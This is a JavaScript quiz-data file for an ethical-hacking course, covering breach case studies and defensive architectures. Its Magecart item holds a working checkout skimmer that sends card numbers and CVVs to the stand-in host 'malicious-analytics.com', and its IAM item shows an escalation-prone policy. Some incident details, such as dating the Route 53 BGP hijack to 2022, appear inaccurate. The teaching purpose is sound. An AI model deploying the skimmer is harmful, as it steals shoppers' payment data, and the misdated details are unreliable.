const questions = [
  {
    question: "What were the primary forensic root causes behind the 2016 Bangladesh Bank SWIFT Heist (₹650 Crores / $81M), and how did ethical hackers isolate the malware?",
    shortAnswer: "Adversaries compromised unsegmented office switches, stole SWIFT operator credentials, and injected malware that hooked a printer DLL to suppress fraudulent MT103 confirmation receipts.",
    explanation: "Forensic investigators (Mandiant and BAE Systems) revealed that the attackers breached the bank through cheap, unmanaged $10 network switches connecting to the SWIFT network. The malware, associated with the Lazarus Group, manipulated the bank's Alliance Access SWIFT software and hooked a PDF printing library (`fxservice.dll`) so that local paper receipts for fraudulent money transfers were never printed, delaying discovery by hours.",
    hint: "Think about cheap unsegmented network switches and a printer DLL hook that concealed fake wire transfers.",
    level: "expert",
    codeExample: `// Bangladesh Bank Attack Sequence:
1. Ingress: Phishing email → Lateral movement to SWIFT Alliance Access server.
2. Malware Injection: evtdt.exe & nroff.exe hooked database transaction tables.
3. Evasion: Modified printer DLL to suppress printed debit confirmation receipts.
4. Remediation: Enforce HSM hardware isolation, 2FA hardware tokens, and network air-gaps.`
  },
  {
    question: "In the 2021 Colonial Pipeline ransomware crisis, what simple architectural vulnerability allowed DarkSide affiliates to shut down 5,500 miles of fuel pipelines?",
    shortAnswer: "An inactive, legacy single-factor VPN account without Multi-Factor Authentication (MFA) that had its password leaked on a dark web credential dump.",
    explanation: "The Colonial Pipeline breach did not involve a sophisticated zero-day. Attackers obtained a single employee password found in an older dark web breach dump. Because the company's legacy virtual private network (VPN) portal did not enforce Multi-Factor Authentication (MFA), the attacker logged directly into the corporate network, deployed DarkSide ransomware, and forced the shutdown of major fuel pipelines across the US East Coast.",
    hint: "Recall the single-factor legacy VPN account with no MFA that caused a nationwide fuel crisis.",
    level: "basic",
    codeExample: `// Colonial Pipeline Breach Mechanics:
Vulnerability: Legacy VPN Gateway running without MFA (Single-Factor Auth).
Credential:    Found in dark web infostealer dump ("Password123!").
Impact:        $4.4 Million (₹35 Crores) ransom paid; 5,500 miles of pipeline halted.
Remediation:   Universal FIDO2 MFA enforcement and decommission of legacy VPN portals.`
  },
  {
    question: "What occurred during the 2022 AIIMS New Delhi cyber attack, and what critical lessons in hospital digital resilience did it provide for Indian healthcare?",
    shortAnswer: "Ransomware encrypted core server databases across AIIMS, paralyzing outpatient registrations and billing for two weeks; highlighted the need for air-gapped immutable backups and strict subnet micro-segmentation.",
    explanation: "In November 2022, the All India Institute of Medical Sciences (AIIMS) in New Delhi suffered a devastating ransomware attack that corrupted over 40 million patient records and paralyzed online services for nearly 14 days. Hospital staff reverted to manual pen-and-paper registrations. The incident prompted CERT-In and Delhi Police Cyber Cell interventions and accelerated national mandates for immutable WORM backups and strict IoMT network segmentation across Indian hospitals.",
    hint: "Remember the major ransomware attack on India's premier medical institute that forced doctors to use pen-and-paper for 2 weeks.",
    level: "basic",
    codeExample: `// AIIMS Delhi Incident Breakdown (2022):
Target:        Core EHR Database & Laboratory Billing Clusters
Downtime:      14 Days of Complete Online Outage (Reverted to Manual Registers)
Data at Risk:  40+ Million Citizen Health Records
Remediation:   Deployment of Air-Gapped S3 WORM Backups & Micro-segmented Hospital VLANs`
  },
  {
    question: "How did the 2015 Ukraine Power Grid Blackout (BlackEnergy 3 / Industroyer) make history as the first cyber attack to physically turn off an electric grid?",
    shortAnswer: "Attackers hijacked SCADA human-machine interfaces (HMI), opened circuit breakers at 30 substations, blinded operators with UPS firmware overwrites, and launched a DDoS on the phone lines to block customer outage reports.",
    explanation: "On December 23, 2015, Russian state-sponsored actors (Sandworm) executed the world's first cyber-induced power outage, leaving 230,000 citizens in the dark. After gaining entry via spear-phishing macros, attackers remotely took mouse control of operator screens, systematically clicked open 220kV circuit breakers across 30 substations, wiped substation bridge firmware (KillDisk), and rewrote UPS microcode to cut off emergency backup power.",
    hint: "Think of hackers taking control of the operator's computer mouse and opening electrical circuit breakers on live power grids.",
    level: "expert",
    codeExample: `// Ukraine Power Grid Attack Chain:
1. Spear-phishing macro deployed BlackEnergy 3 trojan.
2. Pivot from corporate IT into SCADA OT control network.
3. Attackers hijacked operator HMIs → Sent open commands to 30 substation breakers.
4. Deployed KillDisk to brick SCADA servers and flashed UPS firmware to kill power.`
  },
  {
    question: "What was unique about the 2020 SolarWinds Orion Supply Chain Hack (SUNBURST / UNC2452)?",
    shortAnswer: "Attackers compromised the software vendor's internal build pipeline to inject a stealthy backdoor into signed, legitimate software updates distributed to 18,000 global enterprise and government clients.",
    explanation: "Rather than attacking victims directly, APT29 (Cozy Bear) breached SolarWinds' software development environment. They injected a backdoor ('SUNBURST') into `SolarWinds.Orion.Core.BusinessLayer.dll` during compilation. Because the resulting DLL was digitally signed with SolarWinds' authentic cryptographic certificate, over 18,000 organizations (including the US Treasury, Department of Homeland Security, and Fortune 500 firms) downloaded and installed the trojanized update automatically.",
    hint: "Recall the famous supply chain attack where malware was inserted into a software company's official digitally signed updates.",
    level: "expert",
    codeExample: `// SolarWinds Build Injection (SUNBURST):
1. Developer writes legitimate code.
2. Build Pipeline: Injected background process swaps clean source with trojanized source in RAM.
3. Code Signing: Microsoft Certificate signs the trojanized DLL.
4. Auto-Update: 18,000 customer servers automatically download the backdoor!`
  },
  {
    question: "In the Healthcare sector, why are Internet of Medical Things (IoMT) devices like smart infusion pumps and MRI scanners uniquely vulnerable to cyber attacks?",
    shortAnswer: "IoMT devices run outdated embedded legacy operating systems, lack local EDR agents, cannot be rebooted or patched easily during patient care, and often communicate over unencrypted DICOM/HL7 protocols.",
    explanation: "Unlike enterprise laptops that update weekly, clinical devices (infusion pumps, pacemakers, CT scanners) have multi-year FDA/CDSCO certification lifecycles. They frequently run embedded Windows 7 or Linux with hardcoded maintenance passwords. An attacker compromising an unsegmented hospital network can inject malformed packets into DICOM/HL7 medical telemetry, altering drug dosage limits on active infusion pumps with fatal patient consequences.",
    hint: "Think about hospital medical devices running old operating systems that cannot be patched while treating patients.",
    level: "moderate",
    codeExample: `// IoMT Vulnerability Profile:
Protocol:    DICOM (TCP port 104) / HL7 (Unencrypted cleartext medical data)
OS:          Windows XP / Embedded CE (Cannot install modern EDR agents)
Risk:        Altering insulin/chemotherapy dosage limits on smart infusion pumps
Defense:     Clinical Micro-segmentation & Hardware-Enforced Layer 7 Firewalls`
  },
  {
    question: "In the FinTech sector, what is the role of 'Hardware Security Modules' (HSMs) in securing core UPI 2.0 and ATM PIN processing?",
    shortAnswer: "Tamper-resistant physical cryptographic appliances that store root encryption keys and execute cryptographic operations (PIN encryption, MAC calculation) inside tamper-proof silicon.",
    explanation: "Software running in server RAM is vulnerable to memory scraping (e.g. Mimikatz, FASTCash). Hardware Security Modules (HSMs - e.g. Thales payShield) provide FIPS 140-2 Level 3 physical protection: cryptographic master keys never leave the silicon chip. If an attacker opens the physical HSM casing or attempts voltage glitching, the HSM zeroizes (permanently deletes) all keys instantly.",
    hint: "Think of tamper-proof physical vaults inside bank servers that instantly destroy their keys if someone tries to open them.",
    level: "moderate",
    codeExample: `// HSM Key Protection Workflow:
Master Keys stored inside FIPS 140-2 Level 3 Silicon (Never in RAM)
Transaction → Ingested by HSM → PIN Translated & Signed → Clean Output Returned
Physical Tamper Attempt → Micro-switches trigger instant cryptographic ZEROIZATION!`
  },
  {
    question: "Under the ISA/IEC 62443 standard for Industrial Automation, what are 'Zones' and 'Conduits' in SCADA security architecture?",
    shortAnswer: "'Zones' are logical groupings of industrial assets with identical security requirements; 'Conduits' are dedicated, highly controlled communication paths connecting different zones.",
    explanation: "IEC 62443 prohibits flat industrial networks. Industrial plants are divided into Security Zones (e.g., Safety Instrumented Systems Zone, PLC Control Zone, SCADA Monitoring Zone). All inter-zone communications must pass through strictly monitored Conduits (enforced by industrial firewalls and data diodes) that inspect industrial protocols (Modbus TCP, DNP3, IEC 61850) and block unauthorized control commands.",
    hint: "Remember Zones as rooms with similar security levels and Conduits as secure guarded hallways connecting them.",
    level: "expert",
    codeExample: `// IEC 62443 Architecture:
[ ZONE A: Turbine PLCs (Level 1) ] 
          ↓ [ CONDUIT: Industrial Firewall inspecting IEC 61850 GOOSE ]
[ ZONE B: SCADA HMI Servers (Level 2) ]
          ↓ [ CONDUIT: Unidirectional Optical Data Diode ]
[ ZONE C: Industrial DMZ & Historian (Level 3.5) ]`
  },
  {
    question: "What is 'BGP Route Hijacking', and how have threat actors exploited it to steal millions in cryptocurrency from Web3 platforms?",
    shortAnswer: "Announcing fraudulent Border Gateway Protocol (BGP) routing prefixes to redirect global internet traffic intended for legitimate domains (e.g., DNS servers) through attacker-controlled ASNs.",
    explanation: "The global internet relies on BGP for inter-autonomous system routing. In 2022, attackers hijacked BGP prefixes belonging to Amazon Route 53 DNS. For 2 hours, traffic meant for a major cryptocurrency platform was routed through a rogue server in Russia, which served a spoofed DNS response pointing users to a phishing clone, stealing over ₹20 Crores ($2.4M) in Ethereum in minutes.",
    hint: "Think about tricking the internet's global road map (BGP) to divert traffic meant for a bank to a fake server.",
    level: "expert",
    codeExample: `// BGP Route Hijacking Attack:
Legitimate ASN: AS16509 (Amazon AWS) → Announces 52.84.0.0/16
Attacker ASN:   AS398324 (Rogue ASN)  → Maliciously announces MORE SPECIFIC 52.84.10.0/24
Result: Global routers follow BGP Longest Prefix Match rule, sending all user traffic to attacker!`
  },
  {
    question: "How do Ethical Hackers prevent 'Cloud IAM Privilege Escalation' in AWS, Azure, and Google Cloud Platform?",
    shortAnswer: "By auditing IAM policy documents for overly permissive wildcard permissions (e.g., `iam:PassRole`, `iam:CreatePolicyVersion`, `sts:AssumeRole`) and enforcing SCP guardrails.",
    explanation: "In multi-tenant cloud environments, attackers do not attack the cloud hypervisor; they compromise misconfigured IAM permissions. For instance, a developer role with `iam:CreateAccessKey` can generate root keys for admin accounts. Ethical hackers use tools like CloudFox, ScoutSuite, and Prowler to map IAM privilege escalation paths and enforce Service Control Policies (SCPs) with least privilege access.",
    hint: "Think about auditing AWS and Azure user roles to make sure no low-level user has hidden admin permissions.",
    level: "moderate",
    codeExample: `// Dangerous Overly Permissive AWS IAM Policy:
{
  "Effect": "Allow",
  "Action": [
    "iam:PassRole",       // Allows attaching Admin Role to a new EC2 instance
    "ec2:RunInstances"    // Allows launching an EC2 instance → Instant Cloud Admin Escalation!
  ],
  "Resource": "*"
}`
  },
  {
    question: "What is 'DICOM Protocol Exploit' in healthcare cybersecurity, and how can an ethical hacker secure radiological image archives (PACS)?",
    shortAnswer: "Exploiting unauthenticated DICOM ports (TCP 104) to access, alter, or inject malware into CT scans and MRI imaging files; secured via TLS 1.3 encryption and DICOM viewer hardening.",
    explanation: "Digital Imaging and Communications in Medicine (DICOM) is the global standard for radiological imagery. Historically, Picture Archiving and Communication Systems (PACS) servers leave port 104 open without authentication. Attackers can exfiltrate sensitive scans or alter DICOM pixel data (e.g., deleting cancer nodules from lung CT scans). Ethical hackers secure PACS by enforcing mTLS, role-based access, and deep packet inspection.",
    hint: "Think about securing hospital CT and MRI scan databases from unauthorized tampering.",
    level: "expert",
    codeExample: `// Vulnerable Cleartext DICOM Query (Port 104):
C-FIND-RQ: PatientName = "Mamata*" → Returns unencrypted MRI scans and patient Aadhaar numbers.
Defense: Enforce DICOM-over-TLS (Port 2762) with client certificate authentication (mTLS).`
  },
  {
    question: "What is '5G Network Slicing Security', and how do ethical hackers audit virtualization vulnerabilities in telecom 5G core networks?",
    shortAnswer: "Auditing software-defined network (SDN) and Network Function Virtualization (NFV) isolation to ensure a breach in a public IoT slice cannot traverse to a mission-critical emergency slice.",
    explanation: "5G technology uses Network Slicing to partition a single physical cellular network into multiple virtual slices: e.g. Slice 1 for autonomous vehicles/emergency services, Slice 2 for consumer video streaming, Slice 3 for smart electricity meters. Ethical hackers test inter-slice isolation, auditing Kubernetes container escapes and Service Based Architecture (SBA) REST APIs to prevent cross-slice lateral traversal.",
    hint: "Think about testing the virtual security walls that separate emergency vehicle 5G data from ordinary phone traffic.",
    level: "expert",
    codeExample: `// 5G Core Network Slicing Architecture:
[ Slice 1: Mission-Critical SCADA / Ambulance ] → Ultra-Reliable Low-Latency (URLLC)
                 | (Strict Virtualized Isolation Barrier - Zero Inter-Slice Routing)
[ Slice 2: Consumer Mobile Broadband (eMBB) ]   → High Bandwidth Video Streaming
Audit Task: Validate that compromising Slice 2 container cannot inject packets into Slice 1.`
  },
  {
    question: "What was the 'Target Corporation Data Breach' (2013), and how did it establish Third-Party Vendor Supply Chain Risk as an enterprise priority?",
    shortAnswer: "Attackers stole credentials from an external HVAC (refrigeration) vendor, pivoted from the billing portal into the corporate network, and infected 40,000 POS terminals to steal 40M credit cards.",
    explanation: "In 2013, black-hat hackers sent a phishing email to Fazio Mechanical Services (a third-party heating and air-conditioning contractor for Target). Using the contractor's valid credentials to access Target's vendor billing portal, the attackers moved laterally into the internal corporate network, deployed custom memory-scraping malware (Kaptoxa) on point-of-sale registers, and stole 40 million credit card numbers, costing Target over ₹1,600 Crores ($200M).",
    hint: "Recall the famous breach where hackers broke into an air-conditioning vendor to steal millions of retail credit cards.",
    level: "basic",
    codeExample: `// Target Breach Supply Chain Pivot:
Phish HVAC Contractor → Log into Vendor Billing Portal → Pivot to Flat Internal Network → Infect 40,000 POS Terminals`
  },
  {
    question: "What is 'Optical Data Diode' technology, and why is it mandatory for protecting 220kV power grids and nuclear reactor telemetry?",
    shortAnswer: "A hardware device with a physical LED transmitter and photo-receiver that allows data to travel in only one physical direction, physically guaranteeing zero inbound cyber attacks.",
    explanation: "Software firewalls can have zero-day vulnerabilities or misconfigurations. An optical data diode uses a fiber-optic cable with the return wire physically removed: the transmitting LED converts electrical data into light, and the receiving photodiode converts light back to data. Because light cannot travel backward through a disconnected fiber, it is physically and mathematically impossible for an external attacker to send malicious commands into the protected SCADA network.",
    hint: "Think of a physical one-way mirror made of light where data can only flow out, making it physically impossible for hacks to flow in.",
    level: "basic",
    codeExample: `// Optical Data Diode Physical Architecture:
[ SCADA 220kV Grid ] → [ Physical LED Transmitter ] ---- (One-Way Light Beam) ----> [ Photoreceiver ] → [ Public Corporate Dashboard ]
// Result: Corporate users can view live power output, but 0.00 bits of attack traffic can flow back!`
  },
  {
    question: "In Aerospace & Aviation cybersecurity, what is the 'ACARS' and 'ADS-B' vulnerability spectrum?",
    shortAnswer: "Legacy aircraft tracking (ADS-B) and messaging (ACARS) protocols transmit in unencrypted, unauthenticated radio frequencies, allowing adversaries to spoof fake aircraft positions.",
    explanation: "Automatic Dependent Surveillance-Broadcast (ADS-B on 1090 MHz) and Aircraft Communications Addressing and Reporting System (ACARS) were designed decades ago without cryptographic authentication. Ethical researchers have demonstrated using cheap Software Defined Radios (SDRs like HackRF) to broadcast ghost aircraft tracks on civilian air traffic radar screens, driving international aviation bodies to mandate cryptographic authentication in next-gen avionics.",
    hint: "Think about airplanes broadcasting their GPS location over unencrypted radio frequencies that can be spoofed with a small radio.",
    level: "moderate",
    codeExample: `// ADS-B Radio Transmission:
Frequency: 1090 MHz Mode S Extended Squitter
Flaw: Unencrypted, Unauthenticated broadcast
Vulnerability: Ghost Aircraft Injection via Software Defined Radio (SDR)
Remediation: Next-Generation Cryptographic ADS-B Authenticated Signatures`
  },
  {
    question: "How do Ethical Hackers conduct 'PCI-DSS 4.0 Compliance Audits' for eCommerce and Payment Gateways?",
    shortAnswer: "By validating that the Cardholder Data Environment (CDE) is completely isolated, all card numbers are tokenized, multi-factor authentication is enforced, and automated WAFs protect payment forms.",
    explanation: "Under Payment Card Industry Data Security Standard (PCI-DSS 4.0), storing raw credit card CVV numbers is strictly forbidden. Ethical auditors verify: 1. Complete network segmentation of the CDE; 2. Modern tokenization (replacing card numbers with random surrogate tokens); 3. End-to-end encryption with AES-256; 4. Automated client-side script inspection to prevent Magecart web-skimming attacks.",
    hint: "Remember the global security standard that strictly forbids storing raw credit card CVVs and mandates tokenization.",
    level: "basic",
    codeExample: `// PCI-DSS 4.0 Mandatory Controls:
[X] Requirement 3: Never store sensitive authentication data (CVV/PIN) after authorization.
[X] Requirement 6.4.3: Manage all client-side JavaScript scripts on payment checkout pages (Anti-Magecart).
[X] Requirement 8: Enforce MFA on all administrative access to the Cardholder Data Environment (CDE).`
  },
  {
    question: "What is 'Magecart' (e-Commerce Web-Skimming), and how do ethical hackers detect malicious script injection on checkout pages?",
    shortAnswer: "Injecting malicious JavaScript into compromised third-party web libraries (like chat widgets or analytics) on checkout pages to intercept credit card numbers as users type them.",
    explanation: "In Magecart attacks (such as the British Airways and Ticketmaster breaches), attackers compromise a third-party JavaScript script hosted on an external CDN. When a customer inputs their card number on the checkout page, the injected JavaScript listens to the form input fields and stealthily exfiltrates the credentials to an attacker-controlled drop server before form submission.",
    hint: "Think of an invisible script secretly watching what you type into an online shopping cart checkout form.",
    level: "moderate",
    codeExample: `// Magecart Form Skimmer JavaScript:
document.querySelector('#checkout-form').addEventListener('submit', function() {
    var cardData = {
        cc: document.querySelector('#cc-num').value,
        cvv: document.querySelector('#cvv').value,
        exp: document.querySelector('#exp-date').value
    };
    new Image().src = 'https://malicious-analytics.com/log?d=' + btoa(JSON.stringify(cardData));
});`
  },
  {
    question: "How does the 'Purdue Enterprise Reference Architecture' prevent corporate ransomware from paralyzing manufacturing assembly lines?",
    shortAnswer: "By enforcing strict Layer 3.5 Industrial DMZ boundaries with dual-homed servers, protocol conversion proxies, and forbidding direct IT-to-OT IP routing.",
    explanation: "When ransomware infects corporate email workstations (Level 4/5), it spreads rapidly via SMB/RPC lateral movement. If the factory manufacturing floor (Levels 0-3) is properly architected with an Industrial DMZ (Level 3.5), the ransomware cannot traverse across the boundary because direct TCP/IP routing is forbidden. The factory continues physical operations safely while corporate IT recovers.",
    hint: "Think about keeping the factory machines working even if the front-office accounting computers get locked by ransomware.",
    level: "moderate",
    codeExample: `// Purdue Enterprise Architecture (IT vs OT Separation):
Level 4/5: Corporate IT (Email, Accounting, Web) → INFECTED BY RANSOMWARE!
     || [ STRICT IDMZ LEVEL 3.5 BARRIER: No Direct Routing / Protocol Break ]
Level 3:   Plant Operations (SCADA Historian, Engineering Console) → SAFE
Level 2:   Control Systems (HMI, SCADA Servers)                    → SAFE
Level 1/0: Physical Devices (PLCs, Robots, Turbines)               → SAFE & RUNNING!`
  },
  {
    question: "What is 'Digital Twin Security Modeling' in industrial cyber defense?",
    shortAnswer: "Creating an exact virtual software replica of a physical power plant or manufacturing facility to test cyber attack scenarios and validate patches without risking real-world physical damage.",
    explanation: "Testing exploits or firmware updates on live 220kV power substations or nuclear turbines is hazardous. A Digital Twin replicates the entire SCADA environment—PLC logic, network telemetry, thermodynamics, and physical physics. Ethical hackers execute adversary emulation drills against the Digital Twin to evaluate detection rules and verify that patches will not cause mechanical failure before deploying them to real machines.",
    hint: "Think of a virtual computer simulation of a power plant used to test cyber attacks without blowing up real machines.",
    level: "expert",
    codeExample: `// Digital Twin Validation Workflow:
1. Physical Asset: 220kV Gas-Insulated Substation in Barrackpore.
2. Digital Twin: Real-time virtual replica running physics engine + simulated IEC 61850 network.
3. Ethical Red Team Attack: Injects malicious circuit trip commands into Digital Twin.
4. Validation: Verifies SIEM alarms trigger within 2.4s and automatic backup relays prevent virtual blackout.`
  },
  {
    question: "Synthesizing the entire Module 002_002: what is the ultimate ethical and professional mission of the Ethical Hacker in 21st-century society?",
    shortAnswer: "To serve as the trusted guardians of human freedom, national infrastructure, economic prosperity, and citizen privacy in an increasingly contested digital world.",
    explanation: "From safeguarding hospital infusion pumps and 220kV electrical grids to protecting financial transactions and individual privacy under the DPDP Act 2023, the ethical hacker stands at the intersection of technology, law, and human welfare. By combining deep offensive mastery with uncompromising ethical integrity and continuous collaboration, ethical hackers ensure that our digital society remains resilient, free, and secure for generations to come.",
    hint: "Conclude by reflecting on the noble and vital role ethical hackers play in defending modern human civilization.",
    level: "expert",
    codeExample: `// The Final Code of the Ethical Hacker:
while (digital_society.exists()) {
    think_like_adversary();
    defend_with_unyielding_integrity();
    protect_human_welfare();
}`
  }
];

export default questions;
